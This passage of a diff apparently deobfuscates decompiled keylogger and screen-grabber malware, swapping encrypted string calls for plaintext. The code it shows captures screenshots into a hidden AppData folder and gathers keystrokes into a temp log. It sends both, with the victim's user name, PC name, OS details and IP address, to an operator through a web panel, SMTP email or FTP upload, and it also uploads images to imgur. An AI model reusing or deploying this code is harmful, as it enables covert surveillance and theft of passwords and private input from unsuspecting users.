+					Convert.ToString("Client-ID ") + str
 				}, null, null, null, true);
 				object obj2 = new NameValueCollection();
 				object instance = obj2;
-				string memberName = O.I("cXvxK6cp99QmpqjnL/148g==");
+				string memberName = "add";
 				object[] array = new object[2]
 				{
-					O.I("ks5MgUfVkVYEd/kJQb2ezw=="),
+					"image",
 					XG_141
 				};
 				object[] arguments = array;
@@ -2588,10 +2598,10 @@ internal sealed class N
 				{
 					XG_141 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
 				}
-				string memberName2 = O.I("W/RSLZtn/V2Yc2Oaawwueg==");
+				string memberName2 = "UploadValues";
 				object[] array3 = new object[2]
 				{
-					O.I("dO9fGeJ7Kp6EKvpiNLAD0eLlyk0Aygl2BzPxZIEvArt31Bkb8lDLceEWVynauycl"),
+					"https://api.imgur.com/3/upload.xml",
 					RuntimeHelpers.GetObjectValue(obj2)
 				};
 				object[] arguments2 = array3;
@@ -2667,32 +2677,45 @@ internal sealed class N
 			Point upperLeftSource = new Point(0, 0);
 			Point upperLeftDestination = new Point(0, 0);
 			graphics.CopyFromScreen(upperLeftSource, upperLeftDestination, blockRegionSize);
-			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + O.I("XDW+23+22aO582jMRAeFnA==")))
+			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot"))
 			{
-				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + O.I("XDW+23+22aO582jMRAeFnA=="));
-				File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + O.I("XDW+23+22aO582jMRAeFnA=="), FileAttributes.Hidden);
+				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot");
+				File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot", FileAttributes.Hidden);
 			}
-			bitmap.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + O.I("ypfDayM/MDyPSlv5Kdo5azdZFpF/T0KYdq/9MnKxVZI="), encoder, encoderParameters);
+			bitmap.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot\screen.jpeg", encoder, encoderParameters);
 			if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
 			{
 				if (_KJ_37)
 				{
-					string text = Convert.ToBase64String(File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + O.I("ypfDayM/MDyPSlv5Kdo5azdZFpF/T0KYdq/9MnKxVZI=")));
-					CC(string.Format(O.I("3T4xI1CvPpe0ypzhkakJ0EBNR0ZuOgpka+Xt3s81PWkyFSR4fqU2jTmYyUfbxzWcHJMpBOmruC7UDvzylf7ARPahyaxxiqiaQKeuiRlggntFnlhPkJpmdosUIqq2culK+naW4A1zSN94YvYMG3n6zXShd+mQHa+GPmBhQn/tDNZefNBjQR9gS68mHxjnArp+sStk4jEIxdoaAa9A1VHcUT75Ki1tN4/dEaP2VDI3FG0TF+B/ZuoIqSWkjklStLGN"), O.I("8S6EhTx7X83IUy7c82QJ7A=="), HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, text, null, null, null, null, null, null, null, BU_72));
+					string text = Convert.ToBase64String(File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot\screen.jpeg"));
+					CC(string.Format(@"type={0}
+hwid={1}
+time={2}
+pcname={3}
+logdata={4}
+screen={5}
+ipadd={6}
+webcam_link={7}
+client={8}
+link={9}
+username={10}
+password={11}
+screen_link={12}
+site_username={13}", "screenshots", HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, text, null, null, null, null, null, null, null, BU_72));
 				}
 			}
 			else if (Operators.CompareString(WEL_46, "smtp", false) == 0)
 			{
 				DateTime now = DateTime.Now;
-				string format = O.I("+KvItdCkbJYVhD5M+8OWWuNMaKVwLuIiBwNvfWU5drw=");
-				string iMW_ = SystemInformation.UserName + O.I("eCqe8oqjGUIRwUWqnBrrpA==") + SystemInformation.ComputerName + O.I("XHhfg114im09fIV8yaSau2C5h0bwfnQpUEMXQqTTL08=") + GO_71;
-				string hS_ = O.I("uNywgp3gcTTyKeIZNvtRFqDBnfUV92CQGHMsBMNEJEAOrU7d7MDLECDC0eY2zvS+RLxYKLxfIdRbffu2teOmyW+bpCfzG3tWFI35VVVduzAC2UTKPI3G+FFWlOe4MuHsqRBPFsMUzS+hvasThCodGqjQQsD5nq8mDKhfSC2GwvzScWOEowAiGyNv+0uoRhoXiKNK3rW4mFF5WcuCEqvxtcWP9lF8j1MCIEToLuId3PdK5uW6E5e+6PBBBNrqD9J/") + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>=================================================</span>";
-				MV(O.I("Y8DAKcz8EsJeHhP0Z+gY3A=="), iMW_, hS_, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + O.I("ypfDayM/MDyPSlv5Kdo5azdZFpF/T0KYdq/9MnKxVZI="));
+				string format = "MM/dd/yyyy HH:mm:ss";
+				string iMW_ = SystemInformation.UserName + "/" + SystemInformation.ComputerName + " Screen Capture From: " + GO_71;
+				string hS_ = "<span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>=================================================</span>";
+				MV("%toemail%", iMW_, hS_, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot\screen.jpeg");
 			}
 			else if (Operators.CompareString(WEL_46, "ftp", false) == 0)
 			{
-				string format2 = O.I("I/tDnJPWEB6yySAivkY/576ixyY2gOP+bLVbbaRIV8A=");
-				VEU(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + O.I("ypfDayM/MDyPSlv5Kdo5azdZFpF/T0KYdq/9MnKxVZI="), O.I("pWf9GeSP/oSVIicTwH+ujQ==") + LR_70.Replace(O.I("eCqe8oqjGUIRwUWqnBrrpA=="), O.I("q542gy/+wDIUJhH3OGKnNg==")) + O.I("W4bCr60vBIwmtjga81qp0A==") + GO_71 + O.I("3TzIyOOSC+3lcpPaeTxO6g==") + DateTime.Now.ToString(format2) + O.I("nt6DnDJw7JlONF3+NnP2Cw=="));
+				string format2 = "yyyy_MM_dd_HH_mm_ss";
+				VEU(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot\screen.jpeg", "Screenshot_" + LR_70.Replace("/", "-") + "_IP_Adress_" + GO_71 + "_" + DateTime.Now.ToString(format2) + ".jpeg");
 			}
 		}
 		catch (Exception ex)
@@ -2741,7 +2764,7 @@ internal sealed class N
 			return;
 		}
 		DateTime now = DateTime.Now;
-		string format = O.I("+KvItdCkbJYVhD5M+8OWWuNMaKVwLuIiBwNvfWU5drw=");
+		string format = "MM/dd/yyyy HH:mm:ss";
 		lock (HDM_38)
 		{
 			ES_92 += HDM_38;
@@ -2751,18 +2774,44 @@ internal sealed class N
 		{
 			try
 			{
-				if (File.Exists(Path.GetTempPath() + O.I("2qbrW8tf2IZoaPGZlcaKWw==")))
+				if (File.Exists(Path.GetTempPath() + "/log.tmp"))
 				{
-					CC(string.Format(O.I("3T4xI1CvPpe0ypzhkakJ0EBNR0ZuOgpka+Xt3s81PWkyFSR4fqU2jTmYyUfbxzWcHJMpBOmruC7UDvzylf7ARPahyaxxiqiaQKeuiRlggntFnlhPkJpmdosUIqq2culK+naW4A1zSN94YvYMG3n6zXShd+mQHa+GPmBhQn/tDNZefNBjQR9gS68mHxjnArp+sStk4jEIxdoaAa9A1VHcUT75Ki1tN4/dEaP2VDI3FG0TF+B/ZuoIqSWkjklStLGN"), O.I("Sc69FTaFZM54u472pPaOXQ=="), HX_68, DateTime.Now.ToString(NQW_69), LR_70, Uri.EscapeDataString(File.ReadAllText(Path.GetTempPath() + O.I("2qbrW8tf2IZoaPGZlcaKWw=="))), null, null, null, null, null, null, null, null, BU_72));
-					File.Delete(Path.GetTempPath() + O.I("2qbrW8tf2IZoaPGZlcaKWw=="));
+					CC(string.Format(@"type={0}
+hwid={1}
+time={2}
+pcname={3}
+logdata={4}
+screen={5}
+ipadd={6}
+webcam_link={7}
+client={8}
+link={9}
+username={10}
+password={11}
+screen_link={12}
+site_username={13}", "keylog", HX_68, DateTime.Now.ToString(NQW_69), LR_70, Uri.EscapeDataString(File.ReadAllText(Path.GetTempPath() + "/log.tmp")), null, null, null, null, null, null, null, null, BU_72));
+					File.Delete(Path.GetTempPath() + "/log.tmp");
 				}
-				CC(string.Format(O.I("3T4xI1CvPpe0ypzhkakJ0EBNR0ZuOgpka+Xt3s81PWkyFSR4fqU2jTmYyUfbxzWcHJMpBOmruC7UDvzylf7ARPahyaxxiqiaQKeuiRlggntFnlhPkJpmdosUIqq2culK+naW4A1zSN94YvYMG3n6zXShd+mQHa+GPmBhQn/tDNZefNBjQR9gS68mHxjnArp+sStk4jEIxdoaAa9A1VHcUT75Ki1tN4/dEaP2VDI3FG0TF+B/ZuoIqSWkjklStLGN"), O.I("Sc69FTaFZM54u472pPaOXQ=="), HX_68, DateTime.Now.ToString(NQW_69), LR_70, Uri.EscapeDataString(ES_92), null, null, null, null, null, null, null, null, BU_72));
+				CC(string.Format(@"type={0}
+hwid={1}
+time={2}
+pcname={3}
+logdata={4}
+screen={5}
+ipadd={6}
+webcam_link={7}
+client={8}
+link={9}
+username={10}
+password={11}
+screen_link={12}
+site_username={13}", "keylog", HX_68, DateTime.Now.ToString(NQW_69), LR_70, Uri.EscapeDataString(ES_92), null, null, null, null, null, null, null, null, BU_72));
 				ES_92 = "";
 			}
 			catch (Exception projectError)
 			{
 				ProjectData.SetProjectError(projectError);
-				File.AppendAllText(Path.GetTempPath() + O.I("2qbrW8tf2IZoaPGZlcaKWw=="), O.I("v4EpbnhZTubu6HTjEZ8Gdw==") + DateTime.Now.ToString(NQW_69) + ")]<br>" + ES_92 + "<br>");
+				File.AppendAllText(Path.GetTempPath() + "/log.tmp", "[SavedLog (" + DateTime.Now.ToString(NQW_69) + ")]<br>" + ES_92 + "<br>");
 				ES_92 = "";
 				ProjectData.ClearProjectError();
 			}
@@ -2771,22 +2820,22 @@ internal sealed class N
 		{
 			try
 			{
-				if (File.Exists(Path.GetTempPath() + O.I("2qbrW8tf2IZoaPGZlcaKWw==")))
+				if (File.Exists(Path.GetTempPath() + "/log.tmp"))
 				{
-					string iMW_ = O.I("qB2IgrG4rJrjzHnozh5XNg==") + SystemInformation.UserName + O.I("eCqe8oqjGUIRwUWqnBrrpA==") + SystemInformation.ComputerName + O.I("vIVCzK1unR/qXJST51ENdS8w1OrXib7HxoYSLPk1gCY=") + GO_71;
-					string hS_ = O.I("uNywgp3gcTTyKeIZNvtRFqDBnfUV92CQGHMsBMNEJEAOrU7d7MDLECDC0eY2zvS+RLxYKLxfIdRbffu2teOmyW+bpCfzG3tWFI35VVVduzAC2UTKPI3G+FFWlOe4MuHsqRBPFsMUzS+hvasThCodGqjQQsD5nq8mDKhfSC2GwvzScWOEowAiGyNv+0uoRhoXiKNK3rW4mFF5WcuCEqvxtcWP9lF8j1MCIEToLuId3PdK5uW6E5e+6PBBBNrqD9J/") + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + File.ReadAllText(Path.GetTempPath() + O.I("2qbrW8tf2IZoaPGZlcaKWw==")) + O.I("82ZGUDSQrPCv8v1Hf+HpRA==");
-					MV(O.I("Y8DAKcz8EsJeHhP0Z+gY3A=="), iMW_, hS_);
-					File.Delete(Path.GetTempPath() + O.I("2qbrW8tf2IZoaPGZlcaKWw=="));
+					string iMW_ = "[Saved Log] " + SystemInformation.UserName + "/" + SystemInformation.ComputerName + " Keystrokes From: " + GO_71;
+					string hS_ = "<span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + File.ReadAllText(Path.GetTempPath() + "/log.tmp") + "</span>";
+					MV("%toemail%", iMW_, hS_);
+					File.Delete(Path.GetTempPath() + "/log.tmp");
 				}
-				string iMW_2 = SystemInformation.UserName + O.I("eCqe8oqjGUIRwUWqnBrrpA==") + SystemInformation.ComputerName + O.I("vIVCzK1unR/qXJST51ENdS8w1OrXib7HxoYSLPk1gCY=") + GO_71;
-				string hS_2 = O.I("uNywgp3gcTTyKeIZNvtRFqDBnfUV92CQGHMsBMNEJEAOrU7d7MDLECDC0eY2zvS+RLxYKLxfIdRbffu2teOmyW+bpCfzG3tWFI35VVVduzAC2UTKPI3G+FFWlOe4MuHsqRBPFsMUzS+hvasThCodGqjQQsD5nq8mDKhfSC2GwvzScWOEowAiGyNv+0uoRhoXiKNK3rW4mFF5WcuCEqvxtcWP9lF8j1MCIEToLuId3PdK5uW6E5e+6PBBBNrqD9J/") + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + ES_92 + O.I("82ZGUDSQrPCv8v1Hf+HpRA==");
-				MV(O.I("Y8DAKcz8EsJeHhP0Z+gY3A=="), iMW_2, hS_2);
+				string iMW_2 = SystemInformation.UserName + "/" + SystemInformation.ComputerName + " Keystrokes From: " + GO_71;
+				string hS_2 = "<span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + ES_92 + "</span>";
+				MV("%toemail%", iMW_2, hS_2);
 				ES_92 = "";
 			}
 			catch (Exception projectError2)
 			{
 				ProjectData.SetProjectError(projectError2);
-				File.AppendAllText(Path.GetTempPath() + O.I("2qbrW8tf2IZoaPGZlcaKWw=="), O.I("v4EpbnhZTubu6HTjEZ8Gdw==") + DateTime.Now.ToString(NQW_69) + ")]<br>" + ES_92 + "<br>");
+				File.AppendAllText(Path.GetTempPath() + "/log.tmp", "[SavedLog (" + DateTime.Now.ToString(NQW_69) + ")]<br>" + ES_92 + "<br>");
 				ES_92 = "";
 				ProjectData.ClearProjectError();
 			}
@@ -2799,19 +2848,19 @@ internal sealed class N
 			}
 			try
 			{
-				string format2 = O.I("I/tDnJPWEB6yySAivkY/576ixyY2gOP+bLVbbaRIV8A=");
-				if (File.Exists(Path.GetTempPath() + O.I("2qbrW8tf2IZoaPGZlcaKWw==")))
+				string format2 = "yyyy_MM_dd_HH_mm_ss";
+				if (File.Exists(Path.GetTempPath() + "/log.tmp"))
 				{
-					JP(O.I("Q9Yhy5Uive3G6Gspdid9EQ==") + LR_70.Replace(O.I("eCqe8oqjGUIRwUWqnBrrpA=="), O.I("q542gy/+wDIUJhH3OGKnNg==")) + O.I("3TzIyOOSC+3lcpPaeTxO6g==") + DateTime.Now.ToString(format2) + O.I("4T5LGk6qEvqUS2xRJLUlww=="), O.I("yN4uMqCl2degCjnj4AuHbO5vNBAmbfUDS0u7etQ1RdNOLEn+BjzrAMNth43QwEFJ8tRPmeHfdsHnW/LmiJ6W9fU+yLxYup6Gq4UA3ctDZ6tBGoBahiCVlkKBNbpmbE/N2pTXeVJ2qlmH45HhNW2EfFF8iE0CbEq6PmD8kFUlLhsCoPcZB/kCjL0LNCYqfV/tArIzwh0vhTtaIcZ1swa02qgQrNEILjcrgB4zolqeykDR72Zbhbs9dMitps7QGYyl") + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + File.ReadAllText(Path.GetTempPath() + O.I("2qbrW8tf2IZoaPGZlcaKWw==")) + O.I("QPOSOv+tW8xdwNqY8eTkUw=="));
-					File.Delete(Path.GetTempPath() + O.I("2qbrW8tf2IZoaPGZlcaKWw=="));
+					JP("Saved_Log_From_" + LR_70.Replace("/", "-") + "_" + DateTime.Now.ToString(format2) + ".html", "<html><span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + File.ReadAllText(Path.GetTempPath() + "/log.tmp") + "</span></html>");
+					File.Delete(Path.GetTempPath() + "/log.tmp");
 				}
-				JP(O.I("hv0n+Cbvmasyx9ibZq4ZmA==") + LR_70.Replace(O.I("eCqe8oqjGUIRwUWqnBrrpA=="), O.I("q542gy/+wDIUJhH3OGKnNg==")) + O.I("W4bCr60vBIwmtjga81qp0A==") + GO_71 + O.I("3TzIyOOSC+3lcpPaeTxO6g==") + DateTime.Now.ToString(format2) + O.I("4T5LGk6qEvqUS2xRJLUlww=="), O.I("yN4uMqCl2degCjnj4AuHbO5vNBAmbfUDS0u7etQ1RdNOLEn+BjzrAMNth43QwEFJ8tRPmeHfdsHnW/LmiJ6W9fU+yLxYup6Gq4UA3ctDZ6tBGoBahiCVlkKBNbpmbE/N2pTXeVJ2qlmH45HhNW2EfFF8iE0CbEq6PmD8kFUlLhsCoPcZB/kCjL0LNCYqfV/tArIzwh0vhTtaIcZ1swa02qgQrNEILjcrgB4zolqeykDR72Zbhbs9dMitps7QGYyl") + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + ES_92 + O.I("QPOSOv+tW8xdwNqY8eTkUw=="));
+				JP("Keystrokes_" + LR_70.Replace("/", "-") + "_IP_Adress_" + GO_71 + "_" + DateTime.Now.ToString(format2) + ".html", "<html><span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + ES_92 + "</span></html>");
 				ES_92 = "";
 			}
 			catch (Exception projectError3)
 			{
